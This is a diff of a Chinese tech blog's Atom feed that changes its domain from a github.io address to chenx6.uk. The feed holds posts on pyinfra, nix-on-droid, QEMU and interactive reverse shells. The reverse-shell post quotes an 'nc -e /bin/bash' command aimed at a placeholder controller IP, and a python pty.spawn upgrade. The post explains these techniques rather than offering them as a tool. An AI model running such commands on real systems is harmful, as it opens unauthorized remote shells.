@@ -2,11 +2,11 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh_CN">
     <title>二进制咸鱼的自我救赎 - linux</title>
     <subtitle>幸福往往是摸的透彻，而敬业的心却常常隐藏。</subtitle>
-    <link rel="self" type="application/atom+xml" href="https://chenx6.github.io/tags/linux/atom.xml"/>
-    <link rel="alternate" type="text/html" href="https://chenx6.github.io/"/>
+    <link rel="self" type="application/atom+xml" href="https://chenx6.uk/tags/linux/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://chenx6.uk"/>
     <generator uri="https://www.getzola.org/">Zola</generator>
     <updated>2024-10-26T00:00:00+00:00</updated>
-    <id>https://chenx6.github.io/tags/linux/atom.xml</id>
+    <id>https://chenx6.uk/tags/linux/atom.xml</id>
     <entry xml:lang="zh_CN">
         <title>成为运维带师 - 用 pyinfra 进行自动化运维</title>
         <published>2024-10-26T00:00:00+00:00</published>
@@ -20,10 +20,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/pyinfra/"/>
-        <id>https://chenx6.github.io/post/pyinfra/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/pyinfra/"/>
+        <id>https://chenx6.uk/post/pyinfra/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/pyinfra/">&lt;p&gt;每次购买新服务器都要手动配置一堆的基础服务，而且配置过程太无聊了。经过研究和试验之后发现：通过 shell 脚本去执行配置就要被 shell script 的很多坑爹细节坑到，而且 shell script 本身功能有有限，还是需要借助一些外部软件来实现更多功能；ansible 配置太复杂，而且我个人不喜欢 yaml 格式，觉得这格式过于奇葩；Nix 学习成本高，而且比较占磁盘空间。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/pyinfra/">&lt;p&gt;每次购买新服务器都要手动配置一堆的基础服务，而且配置过程太无聊了。经过研究和试验之后发现：通过 shell 脚本去执行配置就要被 shell script 的很多坑爹细节坑到，而且 shell script 本身功能有有限，还是需要借助一些外部软件来实现更多功能；ansible 配置太复杂，而且我个人不喜欢 yaml 格式，觉得这格式过于奇葩；Nix 学习成本高，而且比较占磁盘空间。&lt;&#x2F;p&gt;
 &lt;p&gt;有一天，我在 Hacker News 上刷到了 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;pyinfra.com&#x2F;&quot;&gt;pyinfra&lt;&#x2F;a&gt; 这个软件，可以通过 Python 代码进行声明式的配置系统。不觉得很酷吗？作为一个懒狗，我觉得这太酷了，很符合我对自动化运维的想象。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;基本概念&quot;&gt;基本概念&lt;&#x2F;h2&gt;
 &lt;p&gt;安装 pyinfra 很简单，使用 &lt;code&gt;pipx install pyinfra&lt;&#x2F;code&gt; 就完成安装了。&lt;&#x2F;p&gt;
@@ -177,10 +177,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/nix-on-droid/"/>
-        <id>https://chenx6.github.io/post/nix-on-droid/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/nix-on-droid/"/>
+        <id>https://chenx6.uk/post/nix-on-droid/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/nix-on-droid/">&lt;p&gt;对 Linux 感兴趣的用户应该会接触过很多奇怪的 Linux 发行版，例如使用声明式配置文件配置系统的 NixOS，通过一套配置文件就可以搭建起来一个系统。但是 NixOS 的安装和学习曲线都算比较陡峭的，在互联网冲浪的时候，发现有个 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;nix-community&#x2F;nix-on-droid&quot;&gt;nix-on-droid&lt;&#x2F;a&gt; 项目，可以在安卓系统上搭建起一个迷你版本的 Nix 环境，所以就下载体验了一波，并写文记录使用。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/nix-on-droid/">&lt;p&gt;对 Linux 感兴趣的用户应该会接触过很多奇怪的 Linux 发行版，例如使用声明式配置文件配置系统的 NixOS，通过一套配置文件就可以搭建起来一个系统。但是 NixOS 的安装和学习曲线都算比较陡峭的，在互联网冲浪的时候，发现有个 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;nix-community&#x2F;nix-on-droid&quot;&gt;nix-on-droid&lt;&#x2F;a&gt; 项目，可以在安卓系统上搭建起一个迷你版本的 Nix 环境，所以就下载体验了一波，并写文记录使用。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;安装&quot;&gt;安装&lt;&#x2F;h2&gt;
 &lt;p&gt;通过 F-Droid 就可以下载项目的 APK 安装包，安装 APK 之后会进行初始化，该项目会自动从网上下载一个初始化的镜像并进行初始化，在下载和安装完之后就会进入系统了。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;Nix_语言简易教程&quot;&gt;Nix 语言简易教程&lt;&#x2F;h2&gt;
@@ -228,7 +228,7 @@
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#9C3EDA, #C792EA);&quot;&gt;  imports&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; [&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; .&#x2F;kde.nix&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; ]&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  .&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;其他&quot;&gt;其他&lt;&#x2F;h3&gt;
-&lt;p&gt;上面是一些常见的概念，NixOS 还可以做到修改包的默认配置，添加自定义的包等功能，这些功能请查询 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;nix-on-droid&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中提到的官方文档。&lt;&#x2F;p&gt;
+&lt;p&gt;上面是一些常见的概念，NixOS 还可以做到修改包的默认配置，添加自定义的包等功能，这些功能请查询 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;nix-on-droid&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中提到的官方文档。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;实战&quot;&gt;实战&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;使用_nix-shell_来创建开发环境&quot;&gt;使用 nix-shell 来创建开发环境&lt;&#x2F;h3&gt;
 &lt;p&gt;我平时用 Python 来写一些脚本时，需要一个开发环境。这时候就可以通过 nix-shell 命令和相关配置来配置所需要的软件和包。&lt;&#x2F;p&gt;
@@ -346,10 +346,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/qemu/"/>
-        <id>https://chenx6.github.io/post/qemu/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/qemu/"/>
+        <id>https://chenx6.uk/post/qemu/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/qemu/">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/qemu/">&lt;p&gt;从大学开始，我看过了一堆的 QEMU 配置的文章，这些文章要不就是从别的地方复制黏贴出来的，要不就是使用了已经停止维护的工具。所以我决定从网上找一手资料（QEMU Wiki，文档, man qemu，...）来写一篇文章来讲讲怎么简单的配置 QEMU 模拟虚拟机。在文章的最后放了最终运行的命令，大家复制了保存成脚本就可以使用，或者根据自己的要求来配置。（这个脚本已经经过 2 个人使用了，很好用 233）&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;CPU_配置&quot;&gt;CPU 配置&lt;&#x2F;h2&gt;
 &lt;p&gt;下面的选项开启 KVM 全虚拟化支持，能提升虚拟机的速度。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;--enable-kvm&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
@@ -420,10 +420,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/rev_pty/"/>
-        <id>https://chenx6.github.io/post/rev_pty/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/rev_pty/"/>
+        <id>https://chenx6.uk/post/rev_pty/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/rev_pty/">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/rev_pty/">&lt;p&gt;在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 &lt;code&gt;nc -e &#x2F;bin&#x2F;bash $控制机IP $控制机端口&lt;&#x2F;code&gt; 弹出一个 Shell，然后再用 &lt;code&gt;python3 -c &#x27;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#x27;&lt;&#x2F;code&gt; 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;“可交互_Shell”_的原理&quot;&gt;“可交互 Shell” 的原理&lt;&#x2F;h2&gt;
 &lt;p&gt;现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &quot;pty&quot; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。&lt;&#x2F;p&gt;
 &lt;p&gt;而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。&lt;&#x2F;p&gt;
